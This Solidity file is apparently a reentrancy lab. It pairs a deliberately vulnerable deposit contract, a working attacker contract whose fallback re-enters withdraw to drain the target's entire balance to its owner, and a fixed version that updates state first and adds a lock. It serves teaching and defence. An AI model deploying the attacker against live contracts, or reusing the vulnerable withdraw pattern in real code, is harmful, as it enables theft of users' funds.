pragma solidity ^0.4.24;

// Original assignment contract. Use only in a local lab.
contract Dangerous {
    mapping(address => uint) deposits;

    function depositMoney() public payable {
        deposits[msg.sender] += msg.value;
    }

    function withdraw(uint amount) public {
        require(deposits[msg.sender] >= amount);
        if (!msg.sender.call.value(amount)()) {
            revert();
        }
        deposits[msg.sender] -= amount;
    }
}

contract IDangerous {
    function depositMoney() public payable;
    function withdraw(uint amount) public;
}

// Demonstrates the vulnerability against the supplied local lab contract.
contract ReentrancyAttacker {
    IDangerous public target;
    address public owner;
    uint public chunk;

    constructor(address targetAddress) public {
        target = IDangerous(targetAddress);
        owner = msg.sender;
    }

    function attack() public payable {
        require(msg.sender == owner);
        require(msg.value > 0);
        chunk = msg.value;
        target.depositMoney.value(msg.value)();
        target.withdraw(chunk);
        owner.transfer(address(this).balance);
    }

    function() public payable {
        uint remaining = address(target).balance;
        if (remaining > 0) {
            target.withdraw(remaining < chunk ? remaining : chunk);
        }
    }
}

// Same compiler and payment syntax, with effects before interactions and a lock.
contract FixedDangerous {
    mapping(address => uint) public deposits;
    bool private entered;

    modifier nonReentrant() {
        require(!entered);
        entered = true;
        _;
        entered = false;
    }

    function depositMoney() public payable {
        deposits[msg.sender] += msg.value;
    }

    function withdraw(uint amount) public nonReentrant {
        require(deposits[msg.sender] >= amount);
        deposits[msg.sender] -= amount;
        require(msg.sender.call.value(amount)());
    }
}
